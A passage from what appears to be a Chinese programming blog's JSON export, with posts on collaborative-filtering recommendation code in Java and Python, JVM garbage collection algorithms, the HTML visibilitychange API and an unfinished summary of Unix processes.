HashMap&lt;&gt;(); //辅助存储每一个ID对应的用户映射 System.out.println(\"Input user--items maping infermation:&lt;eg:A a b d&gt;\"); scanner.nextLine(); for (int i = 0; i &lt; N ; i++)&#123; //依次处理N个用户 输入数据 以空格间隔 String[] user_item = scanner.nextLine().split(\" \"); int length = user_item.length; userItemLength.put(user_item[0], length-1); //eg: A 3 userID.put(user_item[0], i); //用户ID与稀疏矩阵建立对应关系 idUser.put(i, user_item[0]); //建立物品--用户倒排表 for (int j = 1; j &lt; length; j ++)&#123; if(items.contains(user_item[j]))&#123; //如果已经包含对应的物品--用户映射，直接添加对应的用户 itemUserCollection.get(user_item[j]).add(user_item[0]); &#125; else&#123; //否则创建对应物品--用户集合映射 items.add(user_item[j]); itemUserCollection.put(user_item[j], new HashSet&lt;String&gt;()); //创建物品--用户倒排关系 itemUserCollection.get(user_item[j]).add(user_item[0]); &#125; &#125; &#125; System.out.println(itemUserCollection.toString()); //计算相似度矩阵【稀疏】 Set&lt;Entry&lt;String, Set&lt;String&gt;&gt;&gt; entrySet = itemUserCollection.entrySet(); Iterator&lt;Entry&lt;String, Set&lt;String&gt;&gt;&gt; iterator = entrySet.iterator(); while(iterator.hasNext())&#123; Set&lt;String&gt; commonUsers = iterator.next().getValue(); for (String user_u : commonUsers) &#123; for (String user_v : commonUsers) &#123; if(user_u.equals(user_v))&#123; continue; &#125; sparseMatrix[userID.get(user_u)][userID.get(user_v)] += 1; //计算用户u与用户v都有正反馈的物品总数 &#125; &#125; &#125; System.out.println(userItemLength.toString()); System.out.println(\"Input the user for recommendation:&lt;eg:A&gt;\"); String recommendUser = scanner.nextLine(); System.out.println(userID.get(recommendUser)); //计算用户之间的相似度【余弦相似性】 int recommendUserId = userID.get(recommendUser); for (int j = 0;j &lt; sparseMatrix.length; j++) &#123; if(j != recommendUserId)&#123; System.out.println(idUser.get(recommendUserId)+\"--\"+idUser.get(j)+\"相似度:\"+sparseMatrix[recommendUserId][j]/Math.sqrt(userItemLength.get(idUser.get(recommendUserId))*userItemLength.get(idUser.get(j)))); &#125; &#125; //计算指定用户recommendUser的物品推荐度 for (String item: items)&#123; //遍历每一件物品 Set&lt;String&gt; users = itemUserCollection.get(item); //得到购买当前物品的所有用户集合 if(!users.contains(recommendUser))&#123; //如果被推荐用户没有购买当前物品，则进行推荐度计算 double itemRecommendDegree = 0.0; for (String user: users)&#123; itemRecommendDegree += sparseMatrix[userID.get(recommendUser)][userID.get(user)]/Math.sqrt(userItemLength.get(recommendUser)*userItemLength.get(user)); //推荐度计算 &#125; System.out.println(\"The item \"+item+\" for \"+recommendUser +\"'s recommended degree:\"+itemRecommendDegree); &#125; &#125; scanner.close(); &#125;&#125; 基于项目的CF： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140 import randomimport sysimport mathimport osfrom operator import itemgetterrandom.seed(0)class ItemBasedCF(object): def __init__(self): self.trainset = &#123;&#125; self.testset = &#123;&#125; self.n_sim_movie = 20 self.n_rec_movie = 10 self.movie_sim_mat = &#123;&#125; self.movie_popular = &#123;&#125; self.movie_count = 0 print('Similar movie number = %d' % self.n_sim_movie, file = sys.stderr) print('Recommendend movie number = %d' % self.n_rec_movie,file = sys.stderr) @staticmethod def loadfile(filename): fp = open(filename, 'r') for i, line in enumerate(fp): yield line.strip('\\r\\n') if i % 100000 == 0: print ('load %s(%s)' %(filename,i), file = sys.stderr) fp.close() print('load %s succ' %filename, file = sys.stderr) def generate_dataset(self, filename, pivot = 0.7): trainset_len = 0 testset_len = 0 for line in self.loadfile(filename): user, movie, rating , _= line.split('::') if random.random() &lt; pivot: self.trainset.setdefault(user,&#123;&#125;) self.trainset[user][movie] = int(rating) trainset_len += 1 else: self.testset.setdefault(user,&#123;&#125;) self.testset[user][movie] = int(rating) testset_len += 1 print('split succ , trainset is %d , testset is %d' %(trainset_len,testset_len) , file = sys.stderr) def calc_movie_sim(self): for user, movies in self.trainset.items(): for movie in movies: if movie not in self.movie_popular: self.movie_popular[movie] = 0 self.movie_popular[movie] += 1 print('count movies number and pipularity succ',file = sys.stderr) self.movie_count = len(self.movie_popular) print('total movie number = %d' %self.movie_count, file = sys.stderr) itemsim_mat = self.movie_sim_mat print('building co-rated users matrix', file = sys.stderr) for user, movies in self.trainset.items(): for m1 in movies: for m2 in movies: if m1 == m2: continue itemsim_mat.setdefault(m1,&#123;&#125;) itemsim_mat[m1].setdefault(m2,0) itemsim_mat[m1][m2] += 1 print('build co-rated users matrix succ', file = sys.stderr) print('calculating movie similarity matrix', file = sys.stderr) simfactor_count = 0 PRINT_STEP = 2000000 for m1, related_movies in itemsim_mat.items(): for m2, count in related_movies.items(): itemsim_mat[m1][m2] = count / math.sqrt(self.movie_popular[m1] * self.movie_popular[m2]) simfactor_count += 1 if simfactor_count % PRINT_STEP == 0: print('calcu movie similarity factor(%d)' %simfactor_count, file = sys.stderr) print('calcu similiarity succ', file = sys.stderr) def recommend(self,user): K = self.n_sim_movie N = self.n_rec_movie rank = &#123;&#125; watched_movies = self.trainset[user] for movie, rating in watched_movies.items(): for related_movie, similarity_factor in sorted(self.movie_sim_mat[movie].items(), key=itemgetter(1), reverse=True)[0:K]: if related_movie in watched_movies: continue rank.setdefault(related_movie, 0) rank[related_movie] += similarity_factor * rating return sorted(rank.items(), key=itemgetter(1), reverse=True)[0:N] def evaluate(self): print('evaluation start', file = sys.stderr) N = self.n_rec_movie hit = 0 rec_count = 0 test_count = 0 all_rec_movies = set() popular_sum = 0 for i, user in enumerate(self.trainset): if i % 500 == 0: print('recommend for %d users ' %i , file = sys.stderr) test_movies = self.testset.get(user,&#123;&#125;) rec_movies = self.recommend(user) for movie, _ in rec_movies: if movie in test_movies: hit += 1 all_rec_movies.add(movie) popular_sum += math.log(1 + self.movie_popular[movie]) rec_count += N test_count += len(test_movies) precision = hit / (1.0 * rec_count) recall = hit / (1.0 * test_count) coverage = len(all_rec_movies) / (1.0 * self.movie_count) popularity = popular_sum / (1.0 * rec_count) print('precision is %.4f\\t recall is %.4f \\t coverage is %.4f \\t popularity is %.4f' %(precision,recall,coverage,popularity), file = sys.stderr)if __name__ == '__main__': ratingfile = os.path.join('ml-1m', 'ratings.dat') itemcf = ItemBasedCF() itemcf.generate_dataset(ratingfile) itemcf.calc_movie_sim() itemcf.evaluate() 本文链接： http://www.meng.uno/articles/6f93935a/ 欢迎转载！","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://www.meng.uno/categories/机器学习/"},{"name":"社会网络","slug":"机器学习/社会网络","permalink":"http://www.meng.uno/categories/机器学习/社会网络/"}],"tags":[{"name":"社会网络","slug":"社会网络","permalink":"http://www.meng.uno/tags/社会网络/"},{"name":"商品推荐","slug":"商品推荐","permalink":"http://www.meng.uno/tags/商品推荐/"},{"name":"协同过滤","slug":"协同过滤","permalink":"http://www.meng.uno/tags/协同过滤/"}]},{"title":"JVM的垃圾回收机制","slug":"java-gc","date":"2018-03-09T07:14:32.000Z","updated":"2018-03-09T07:58:03.486Z","comments":true,"path":"articles/dde60b3a/","link":"","permalink":"http://www.meng.uno/articles/dde60b3a/","excerpt":"简介 Java GC（Garbage Collection，垃圾收集，垃圾回收）机制，是Java与C++/C的主要区别之一，作为Java开发者，一般不需要专门编写内存回收和垃圾清理代码，对内存泄露和溢出的问题，也不需要像C程序员那样战战兢兢。这是因为在Java虚拟机中，存在自动内存管理和垃圾清扫机制。概括地说，该机制对JVM（Java Virtual Machine）中的内存进行标记，并确定哪些内存需要回收，根据一定的回收策略，自动的回收内存，永不停息（Nerver Stop）的保证JVM中的内存空间，防止出现内存泄露和溢出问题。 关于JVM，需要说明一下的是，目前使用最多的Sun公司的JD","text":"简介 Java GC（Garbage Collection，垃圾收集，垃圾回收）机制，是Java与C++/C的主要区别之一，作为Java开发者，一般不需要专门编写内存回收和垃圾清理代码，对内存泄露和溢出的问题，也不需要像C程序员那样战战兢兢。这是因为在Java虚拟机中，存在自动内存管理和垃圾清扫机制。概括地说，该机制对JVM（Java Virtual Machine）中的内存进行标记，并确定哪些内存需要回收，根据一定的回收策略，自动的回收内存，永不停息（Nerver Stop）的保证JVM中的内存空间，防止出现内存泄露和溢出问题。 关于JVM，需要说明一下的是，目前使用最多的Sun公司的JDK中，自从1999年的JDK1.2开始直至现在仍在广泛使用的JDK6，其中默认的虚拟机都是HotSpot。2009年，Oracle收购Sun，加上之前收购的EBA公司，Oracle拥有3大虚拟机中的两个：JRockit和HotSpot，Oracle也表明了想要整合两大虚拟机的意图，但是目前在新发布的JDK7中，默认的虚拟机仍然是HotSpot，因此本文中默认介绍的虚拟机都是HotSpot，相关机制也主要是指HotSpot的GC机制。 学习Java GC机制，可以帮助我们在日常工作中排查各种内存溢出或泄露问题，解决性能瓶颈，达到更高的并发量，写出更高效的程序。 解决哪些问题 既然是要进行自动GC，那必然会有相应的策略，而这些策略解决了哪些问题呢，粗略的来说，主要有以下几点。 哪些对象可以被回收。 何时回收这些对象。 采用什么样的方式回收。 说到垃圾回收（Garbage Collection，GC），很多人就会自然而然地把它和Java联系起来。在Java中，程序员不需要去关心内存动态分配和垃圾回收的问题，这一切都交给了JVM来处理。 顾名思义，垃圾回收就是释放垃圾占用的空间，那么在Java中，什么样的对象会被认定为“垃圾”？那么当一些对象被确定为垃圾之后，采用什么样的策略来进行回收（释放空间）？在目前的商业虚拟机中，有哪些典型的垃圾收集器？ 如何确定某个对象是“垃圾”？ 既然垃圾收集器的任务是回收垃圾对象所占的空间供新的对象使用，那么垃圾收集器如何确定某个对象是“垃圾”？即通过什么方法判断一个对象可以被回收了。 在java中是通过引用来和对象进行关联的，也就是说如果要操作对象，必须通过引用来进行。那么很显然一个简单的办法就是通过引用计数来判断一个对象是否可以被回收。不失一般性，如果一个对象没有任何引用与之关联，则说明该对象基本不太可能在其他地方被使用到，那么这个对象就成为可被回收的对象了。这种方式成为引用计数法。 这种方式的特点是实现简单，而且效率较高，但是它无法解决循环引用的问题，因此在Java中并没有采用这种方式（Python采用的是引用计数法）。看下面这段代码： 12345678910111213141516 public class Main &#123; public static void main(String[] args) &#123; MyObject object1 = new MyObject(); MyObject object2 = new MyObject(); object1.object = object2; object2.object = object1; object1 = null; object2 = null; &#125;&#125;class MyObject&#123; public Object object = null;&#125; 最后面两句将object1和object2赋值为null，也就是说object1和object2指向的对象已经不可能再被访问，但是由于它们互相引用对方，导致它们的引用计数都不为0，那么垃圾收集器就永远不会回收它们。 为了解决这个问题，在Java中采取了 可达性分析法。该方法的基本思想是通过一系列的“GC Roots”对象作为起点进行搜索，如果在“GC Roots”和一个对象之间没有可达路径，则称该对象是不可达的，不过要注意的是被判定为不可达的对象不一定就会成为可回收对象。被判定为不可达的对象要成为可回收对象必须至少经历两次标记过程，如果在这两次标记过程中仍然没有逃脱成为可回收对象的可能性，则基本上就真的成为可回收对象了。 至于可达性分析法具体是如何操作的我暂时也没有看得很明白，如果有哪位朋友比较清楚的话请不吝指教。 下面来看个例子： 1234567 Object aobj = new Object ( ) ;Object bobj = new Object ( ) ;Object cobj = new Object ( ) ;aobj = bobj;aobj = cobj;cobj = null;aobj = null; 第几行有可能会使得某个对象成为可回收对象？第7行的代码会导致有对象会成为可回收对象。至于为什么留给读者自己思考。 再看一个例子： 12345 String str = new String(\"hello\");SoftReference&lt;String&gt; sr = new SoftReference&lt;String&gt;(new String(\"java\"));WeakReference&lt;String&gt; wr = new WeakReference&lt;String&gt;(new String(\"world\")); 这三句哪句会使得String对象成为可回收对象？第2句和第3句，第2句在内存不足的情况下会将String对象判定为可回收对象，第3句无论什么情况下String对象都会被判定为可回收对象。 最后总结一下平常遇到的比较常见的将对象判定为可回收对象的情况： 显示地将某个引用赋值为null或者将已经指向某个对象的引用指向新的对象，比如下面的代码： 12345 Object obj = new Object();obj = null;Object obj1 = new Object();Object obj2 = new Object();obj1 = obj2; 局部引用所指向的对象，比如下面这段代码： 12345678 void fun() &#123;..... for(int i=0;i&lt;10;i++) &#123; Object obj = new Object(); System.out.println(obj.getClass()); &#125; &#125; 循环每执行完一次，生成的Object对象都会成为可回收的对象。 只有弱引用与其关联的对象，比如： 1 WeakReference&lt;String&gt; wr = new WeakReference&lt;String&gt;(new String(\"world\")); 典型的垃圾收集算法 在确定了哪些垃圾可以被回收后，垃圾收集器要做的事情就是开始进行垃圾回收，但是这里面涉及到一个问题是：如何高效地进行垃圾回收。由于Java虚拟机规范并没有对如何实现垃圾收集器做出明确的规定，因此各个厂商的虚拟机可以采用不同的方式来实现垃圾收集器，所以在此只讨论几种常见的垃圾收集算法的核心思想。 需要明确的一点是，这里谈到的垃圾回收算法针对的是JVM的堆内存，栈基本上不存在垃圾回收方面的困扰。 Mark-Sweep（标记-清除）算法 这是最基础的垃圾回收算法，之所以说它是最基础的是因为它最容易实现，思想也是最简单的。标记-清除算法分为两个阶段：标记阶段和清除阶段。标记阶段的任务是标记出所有需要被回收的对象，清除阶段就是回收被标记的对象所占用的空间。 标记—清除算法是最基础的收集算法，它分为“标记”和“清除”两个阶段：首先标记出所需回收的对象，在标记完成后统一回收掉所有被标记的对象，它的标记过程其实就是前面的根搜索算法中判定垃圾对象的标记过程。 最基础的收集算法是“标记-清除”（Mark-Sweep）算法，如同它的名字一样，算法分为“标记”和“清除”两个阶段。 标记-清除算法实现起来比较容易，但是有一个比较严重的问题就是容易产生内存碎片，碎片太多可能会导致后续过程中需要为大对象分配空间时无法找到足够的空间而提前触发新的一次垃圾收集动作。 该算法有如下缺点： 标记和清除过程的效率都不高。 标记清除后会产生大量不连续的内存碎片，空间碎片太多可能会导致，当程序在以后的运行过程中需要分配较大对象时无法找到足够的连续内存而不得不触发另一次垃圾收集动作。 我们在程序（程序也就是指我们运行在JVM上的JAVA程序）运行期间如果想进行垃圾回收，就必须让GC线程与程序当中的线程互相配合，才能在不影响程序运行的前提下，顺利的将垃圾进行回收。 为了达到这个目的，标记/清除算法就应运而生了。它的做法是当堆中的有效内存空间（available memory）被耗尽的时候，就会停止整个程序（也被成为stop the world），然后进行两项工作，第一项则是标记，第二项则是清除。 标记：标记的过程其实就是，遍历所有的GC Roots，然后将所有GC Roots可达的对象标记为存活的对象。 清除：清除的过程将遍历堆中所有的对象，将没有标记的对象全部清除掉。 就是当程序运行期间，若可以使用的内存被耗尽的时候，GC线程就会被触发并将程序暂停，随后将依旧存活的对象标记一遍，最终再将堆中所有没被标记的对象全部清除掉，接下来便让程序恢复运行。 Copying（复制）算法 为了解决效率问题，一种称为“复制”（Copying）的收集算法出现了，它将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。 当这一块的内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。 这样使得每次都是对整个半区进行内存回收，内存分配时也就不用考虑内存碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。 只是这种算法的代价是将内存缩小为了原来的一半，未免太高了一点。 现在的商业虚拟机都采用这种收集算法来回收新生代，IBM公司的专门研究表明，新生代中的对象98%是“朝生夕死”的，所以并不需要按照1:1的比例来划分内存空间，而是将内存分为一块较大的Eden空间和两块较小的Survivor空间，每次使用Eden和其中一块Survivor[1]。当回收时，将Eden和Survivor中还存活着的对象一次性地复制到另外一块Survivor空间上，最后清理掉Eden和刚才用过的Survivor空间。 HotSpot虚拟机默认Eden和Survivor的大小比例是8:1，也就是每次新生代中可用内存空间为整个新生代容量的90%（80%+10%），只有10%的内存会被“浪费”。 当然，98%的对象可回收只是一般场景下的数据，我们没有办法保证每次回收都只有不多于10%的对象存活，当Survivor空间不够用时，需要依赖其他内存（这里指老年代）进行分配担保（Handle Promotion）。 内存的分配担保就好比我们去银行借款，如果我们信誉很好，在98%的情况下都能按时偿还，于是银行可能会默认我们下一次也能按时按量地偿还贷款，只需要有一个担保人能保证如果我不能还款时，可以从他的账户扣钱，那银行就认为没有风险了。 内存的分配担保也一样，如果另外一块Survivor空间没有足够空间存放上一次新生代收集下来的存活对象时，这些对象将直接通过分配担保机制进入老年代。 复制算法是针对标记—清除算法的缺点，在其基础上进行改进而得到的，它讲课用内存按容量分为大小相等的两块，每次只使用其中的一块，当这一块的内存用完了，就将还存活着的对象复制到另外一块内存上面，然后再把已使用过的内存空间一次清理掉。复制算法有如下优点： 每次只对一块内存进行回收，运行高效。 只需移动栈顶指针，按顺序分配内存即可，实现简单。 内存回收时不用考虑内存碎片的出现。 它的缺点是：可一次性分配的最大内存缩小了一半。 这种算法虽然实现简单，运行高效且不容易产生内存碎片，但是却对内存空间的使用做出了高昂的代价，因为能够使用的内存缩减到原来的一半。 很显然，Copying算法的效率跟存活对象的数目多少有很大的关系，如果存活对象很多，那么Copying算法的效率将会大大降低。 我们首先一起来看一下复制算法的做法，复制算法将内存划分为两个区间，在任意时间点，所有动态分配的对象都只能分配在其中一个区间（称为活动区间），而另外一个区间（称为空闲区间）则是空闲的。 当有效内存空间耗尽时，JVM将暂停程序运行，开启复制算法GC线程。接下来GC线程会将活动区间内的存活对象，全部复制到空闲区间，且严格按照内存地址依次排列，与此同时，GC线程将更新存活对象的内存引用地址指向新的内存地址。 此时，空闲区间已经与活动区间交换，而垃圾对象现在已经全部留在了原来的活动区间，也就是现在的空闲区间。事实上，在活动区间转换为空间区间的同时，垃圾对象已经被一次性全部回收。 很明显，复制算法弥补了标记/清除算法中，内存布局混乱的缺点。不过与此同时，它的缺点也是相当明显的。 它浪费了一半的内存，这太要命了。 如果对象的存活率很高，我们可以极端一点，假设是100%存活，那么我们需要将所有对象都复制一遍，并将所有引用地址重置一遍。复制这一工作所花费的时间，在对象存活率达到一定程度时，将会变的不可忽视。 所以从以上描述不难看出，复制算法要想使用，最起码对象的存活率要非常低才行，而且最重要的是，我们必须要克服50%内存的浪费。 Mark-Compact（标记-整理）算法 为了解决Copying算法的缺陷，充分利用内存空间，提出了Mark-Compact算法。该算法标记阶段和Mark-Sweep一样，但是在完成标记之后，它不是直接清理可回收对象，而是将存活对象都向一端移动，然后清理掉端边界以外的内存。 复制收集算法在对象存活率较高时就要进行较多的复制操作，效率将会变低。 更关键的是，如果不想浪费50%的空间，就需要有额外的空间进行分配担保，以应对被使用的内存中所有对象都100%存活的极端情况，所以在老年代一般不能直接选用这种算法。 根据老年代的特点，有人提出了另外一种“标记-整理”（Mark-Compact）算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 标记/整理算法与标记/清除算法非常相似，它也是分为两个阶段：标记和整理。下面LZ给各位介绍一下这两个阶段都做了什么。 标记：它的第一个阶段与标记/清除算法是一模一样的，均是遍历GC Roots，然后将存活的对象标记。 整理：移动所有存活的对象，且按照内存地址次序依次排列，然后将末端内存地址以后的内存全部回收。因此，第二阶段才称为整理阶段。 复制算法比较适合于新生代，在老年代中，对象存活率比较高，如果执行较多的复制操作，效率将会变低，所以老年代一般会选用其他算法，如标记—整理算法。该算法标记的过程与标记—清除算法中的标记过程一样，但对标记后出的垃圾对象的处理情况有所不同，它不是直接对可回收对象进行清理，而是让所有的对象都向一端移动，然后直接清理掉端边界以外的内存。 不难看出，标记/整理算法不仅可以弥补标记/清除算法当中，内存区域分散的缺点，也消除了复制算法当中，内存减半的高额代价，可谓是一举两得，一箭双雕，一石两鸟。 不过任何算法都会有其缺点，标记/整理算法唯一的缺点就是效率也不高，不仅要标记所有存活对象，还要整理所有存活对象的引用地址。从效率上来说，标记/整理算法要低于复制算法。 Generational Collection（分代收集）算法 分代收集算法是目前大部分JVM的垃圾收集器采用的算法。它的核心思想是根据对象存活的生命周期将内存划分为若干个不同的区域。一般情况下将堆区划分为老年代（Tenured Generation）和新生代（Young Generation），老年代的特点是每次垃圾收集时只有少量对象需要被回收，而新生代的特点是每次垃圾回收时都有大量的对象需要被回收，那么就可以根据不同代的特点采取最适合的收集算法。 目前大部分垃圾收集器对于新生代都采取Copying算法，因为新生代中每次垃圾回收都要回收大部分对象，也就是说需要复制的操作次数较少，但是实际中并不是按照1：1的比例来划分新生代的空间的。一般来说是将新生代划分为一块较大的Eden空间和两块较小的Survivor空间，每次使用Eden空间和其中的一块Survivor空间，当进行回收时，将Eden和Survivor中还存活的对象复制到另一块Survivor空间中，然后清理掉Eden和刚才使用过的Survivor空间。 而由于老年代的特点是每次回收都只回收少量对象，一般使用的是Mark-Compact算法。 注意，在堆区之外还有一个代就是永久代（Permanet Generation），它用来存储class类、常量、方法描述等。对永久代的回收主要回收两部分内容：废弃常量和无用的类。 当前商业虚拟机的垃圾收集 都采用分代收集，它根据对象的存活周期的不同将内存划分为几块，一般是把Java堆分为新生代和老年代。在新生代中，每次垃圾收集时都会发现有大量对象死去，只有少量存活，因此可选用复制算法来完成收集，而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用标记—清除算法或标记—整理算法来进行回收。 典型的垃圾收集器 垃圾收集算法是 内存回收的理论基础，而垃圾收集器就是内存回收的具体实现。下面介绍一下HotSpot（JDK 7)虚拟机提供的几种垃圾收集器，用户可以根据自己的需求组合出各个年代使用的收集器。 Serial/Serial Old Serial/Serial Old收集器是最基本最古老的收集器，它是一个单线程收集器，并且在它进行垃圾收集时，必须暂停所有用户线程。Serial收集器是针对新生代的收集器，采用的是Copying算法，Serial Old收集器是针对老年代的收集器，采用的是Mark-Compact算法。它的优点是实现简单高效，但是缺点是会给用户带来停顿。 ParNew ParNew收集器是Serial收集器的多线程版本，使用多个线程进行垃圾收集。 Parallel Scavenge Parallel Scavenge收集器是一个新生代的多线程收集器（并行收集器），它在回收期间不需要暂停其他用户线程，其采用的是Copying算法，该收集器与前两个收集器有所不同，它主要是为了达到一个可控的吞吐量。 Parallel Old Parallel Old是Parallel Scavenge收集器的老年代版本（并行收集器），使用多线程和Mark-Compact算法。 CMS CMS（Current Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器，它是一种并发收集器，采用的是Mark-Sweep算法。 G1 G1收集器是当今收集器技术发展最前沿的成果，它是一款面向服务端应用的收集器，它能充分利用多CPU、多核环境。因此它是一款并行与并发收集器，并且它能建立可预测的停顿时间模型。 本文链接： http://www.meng.uno/articles/dde60b3a/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"http://www.meng.uno/tags/JVM/"},{"name":"GC","slug":"GC","permalink":"http://www.meng.uno/tags/GC/"},{"name":"垃圾回收","slug":"垃圾回收","permalink":"http://www.meng.uno/tags/垃圾回收/"}]},{"title":"H5网页失去焦点Title改变的方法","slug":"h5-title","date":"2018-03-08T06:33:11.000Z","updated":"2018-03-08T06:47:36.988Z","comments":true,"path":"articles/7794c7e7/","link":"","permalink":"http://www.meng.uno/articles/7794c7e7/","excerpt":"今天要讲的其实是一个API：visibilitychange 这个 API 本身非常简单，由以下三部分组成。 document.hidden：表示页面是否隐藏的布尔值。页面隐藏包括 页面在后台标签页中 或者 浏览器最小化 （注意，页面被其他软件遮盖并不算隐藏，比如打开的 sublime 遮住了浏览器）。 document.visibilityState：表示下面 4 个可能状态的值 hidden：页面在后台标签页中或者浏览器最小化 visible：页面在前台标签页中 prerender：页面在屏幕外执行预渲染处理 document.hidden 的值为 true unloaded","text":"今天要讲的其实是一个API：visibilitychange 这个 API 本身非常简单，由以下三部分组成。 document.hidden：表示页面是否隐藏的布尔值。页面隐藏包括 页面在后台标签页中 或者 浏览器最小化 （注意，页面被其他软件遮盖并不算隐藏，比如打开的 sublime 遮住了浏览器）。 document.visibilityState：表示下面 4 个可能状态的值 hidden：页面在后台标签页中或者浏览器最小化 visible：页面在前台标签页中 prerender：页面在屏幕外执行预渲染处理 document.hidden 的值为 true unloaded：页面正在从内存中卸载 Visibilitychange事件：当文档从可见变为不可见或者从不可见变为可见时，会触发该事件。 这样，我们可以监听 Visibilitychange 事件，当该事件触发时，获取 document.hidden 的值，根据该值进行页面一些事件的处理。 123456789101112131415161718192021 &lt;!DOCTYPE html&gt;&lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;这是原来的title&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/&gt; &lt;script&gt; var tmptitle = document.title; document.addEventListener('visibilitychange', function() &#123; var isHidden = document.hidden; if (isHidden) &#123; document.title = '当焦点不在当前窗口时的网页标题'; &#125; else &#123; document.title = tmptitle; &#125; &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 本文链接： http://www.meng.uno/articles/7794c7e7/ 欢迎转载！","categories":[{"name":"随笔","slug":"随笔","permalink":"http://www.meng.uno/categories/随笔/"}],"tags":[{"name":"H5","slug":"H5","permalink":"http://www.meng.uno/tags/H5/"},{"name":"Title","slug":"Title","permalink":"http://www.meng.uno/tags/Title/"},{"name":"焦点","slug":"焦点","permalink":"http://www.meng.uno/tags/焦点/"}]},{"title":"Unix进程的那些事","slug":"unix-process","date":"2018-03-04T12:06:22.000Z","updated":"2018-03-04T12:56:59.397Z","comments":true,"path":"articles/aeaab565/","link":"","permalink":"http://www.meng.uno/articles/aeaab565/","excerpt":"不知道你们有没有这样的疑惑，每次在看资料时遇到fork(2)，我都不理解，为什么fork()函数需要2做参数？还只能是2。 本篇博客在阅读了《Working with Unix Processes》之后总结而成。 回答疑问 首先，我就来解释一下之前留下的那个疑问，用过Mac或者Linux的同学都知道电脑中有很多man文件夹，我也不知道怎么回事，莫非是因为我是个man？后来我知道了，man是manpages的意思，中文译作“Unix手册页”，和我们现实中使用的手册一样，这个手册也是分节的，其中比较重要的几节： * 节1：一般命令 * 节2：系统调用 * 节3：C库函数 * 节4：特","text":"不知道你们有没有这样的疑惑，每次在看资料时遇到fork(2)，我都不理解，为什么fork()函数需要2做参数？还只能是2。 本篇博客在阅读了《Working with Unix Processes》之后总结而成。 回答疑问 首先，我就来解释一下之前留下的那个疑问，用过Mac或者Linux的同学都知道电脑中有很多man文件夹，我也不知道怎么回事，莫非是因为我是个man？后来我知道了，man是manpages的意思，中文译作“Unix手册页”，和我们现实中使用的手册一样，这个手册也是分节的，其中比较重要的几节： 节1：一般命令 节2：系统调用 节3：C库函数 节4：特殊文件 那么我们该如何使用这个手册呢？ 很简单 我们只需要：man [节号] 命令名就可以了。 例如：man 2 fork 1234567891011121314151617181920212223242526272829303132333435 fork() will fail and no child process will be created if: [EAGAIN] The system-imposed limit on the total number of processes under execution would be exceeded. This limit is configuration-depen- dent. [EAGAIN] The system-imposed limit MAXUPRC (&lt;sys/param.h&gt;) on the total num- ber of processes under execution by a single user would be exceeded. [ENOMEM] There is insufficient swap space for the new process.LEGACY SYNOPSIS #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; The include file &lt;sys/types.h&gt; is necessary.SEE ALSO execve(2), sigaction(2), wait(2), compat(5)HISTORY A fork() function call appeared in Version 6 AT&amp;T UNIX.CAVEATS There are limits to what you can do in the child process. To be totally safe you should restrict yourself to only executing async-signal safe operations until such time as one of the exec functions is called. All APIs, including global data sym- bols, in any framework or library should be assumed to be unsafe after a fork() unless explicitly documented to be safe or async-signal safe. If you need to use these frameworks in the child process, you must exec. In this situation it is rea- sonable to exec yourself.4th Berkeley Distribution June 4, 1993 4th Berkeley Distribution(END) 这就是完整的对fork(2)的解释。 Unix进程 提示 所有Ruby代码皆需要在irb环境下运行，如何安装Ruby，可以百度。 进程标识 每个人都有一个唯一的身份证号，进程也是如此，这个唯一的标识符叫做pid。我们输入：puts Process.pid就可以得到当前进程的pid了。 pid并不传达关于进程本身的任何信息，它仅仅是一个顺序标识符。在内核眼中进程只是一个数字而已。 pid是对进程的一种简单通用的描述，至于用途之一，比如我们常常会在日志文件中发现pid，当有多个进程向一个日志文件写入日志的时候，在每一行加入pid就可以知道哪一行日志是由哪个进程写入的。 父进程 系统中运行的每一个进程都有对应的父进程，每一个进程都知道其父进程的标识符(ppid)。多数情况下特定进程的父进程就是调用它的那个进程。比如启动终端并进入bash提示符，此时新创建的bash进程的父进程就是终端进程。如果在bash中调用ls等命令，那么bash进程便是ls进程的父进程。 父进程对于检测守护进程有比较重要的作用。 我们输入：puts Process.ppid就可以得到当前进程的父进程pid了。 文件描述符 我们讨论进程，怎么突然说道“文件”？其实，在Unix眼中，一切皆为“文件”！设备是文件，套接字是文件，文件也是文件。当然为了避免误解，一般将文件称为文件，其他称为资源。 我们使用这样的语句打印某“文件”的描述符：puts 文件名.fileno。 例如，STDIN的描述符：puts STDIN.fileno，结果是不是很吃惊？因为居然是0！！！ 同理，排在其后的分别是STDOUT与STDERR，他们三者也被称为标准流。 资源限制 文件描述符代表已经打开的资源，当资源没有被关闭时，该资源的文件描述符编号会一直被占用，文件描述符编号一直处于递增状态，而内核为每个进程设置了最大文件描述符号，即施加了一些资源限制。对于文件描述符编号的限制有软限制和硬限制。软限制一般可以比较小而硬限制一般数值比较大而且可以修改。如果超出限制则会报错。 资源限制除了允许打开的最大资源数以外，还包括可创建的最大文件长度和进程最大段的大小等。对于用户内核会限制其最大并发进程数。 我们使用p Process.getrlimit(:NOFILE)来获取当前进程的资源限制，在我的电脑上结果是：[256, 9223372036854775807]。 可能我们觉得软限制256有点少，那好，我们尝试给他设置一个大的。使用如下命令： Process.setrlimit(:NOFILE,4096) 环境变量 